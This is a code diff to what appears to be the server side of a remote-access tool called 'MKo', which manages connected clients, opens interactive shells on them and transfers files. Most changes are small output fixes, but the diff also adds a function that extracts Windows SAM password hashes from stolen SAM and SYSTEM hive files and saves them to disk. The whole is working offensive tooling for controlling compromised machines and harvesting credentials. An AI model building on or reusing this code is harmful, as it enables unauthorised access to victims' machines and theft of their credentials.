@@ -97,11 +97,11 @@ def print_mko_banner():
 
 
 def print_mko_prefix():
-    print("MKo > ", end="")
+    print("MKo > ", end="", flush=True)
 
 
 def print_mko_client(client_id):
-    print(f"MKo (client {client_id}) > ", end="")
+    print(f"MKo (client {client_id}) > ", end="", flush=True)
 
 
 def use_manager(thread_id, thread_to_conn, client_queues):
@@ -139,7 +139,7 @@ def upload_file(file_path, conn):
 
 
 def print_progress(progress, nbr_of_dot):
-    print("\rReceiving (" + progress + "%)" + "." * nbr_of_dot, end="", flush=True)
+    print("\rReceiving (" + progress + "%)" + "." * nbr_of_dot, end=" ", flush=True)
     if nbr_of_dot == 3:
         return 1
     else:
@@ -167,9 +167,10 @@ def download_file(file_path, conn):
 
         # receive the file
         random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + "_"
+        download_path = "Downloads/" + random_str + filename
 
         nbr_of_dot = 1
-        with open("Downloads/"+random_str + filename, "wb") as file:
+        with open(download_path, "wb") as file:
             received = 0
             while received < file_size:
                 chunk = conn.recv(min(1024, file_size - received))
@@ -181,7 +182,7 @@ def download_file(file_path, conn):
                 progress = str(round(((received / file_size) * 100)))
                 nbr_of_dot = print_progress(progress, nbr_of_dot)
 
-
+        return download_path
 def interact_shell(conn, client_id):
     print(f"MKo Shell (client {client_id}) > ", end="")
     conn.send("shell".encode('utf-8'))
@@ -217,3 +218,19 @@ def format_filename(commande):
         return file_path.split("\\")[-1], file_path
     else:
         return file_path, file_path
+
+def secret_dump_from_file(sam_path, system_path):
+    try:
+        # Initialize LocalOperations class
+        local_ops = LocalOperations(system_path)
+        boot_key = local_ops.getBootKey()
+
+        # Dump SAM hashes
+        sam_hashes = SAMHashes(sam_path, boot_key, isRemote=False)
+        sam_hashes.dump()
+        sam_hashes.export('Downloads/sam_hashes')
+
+        print("Dump completed successfully.")
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
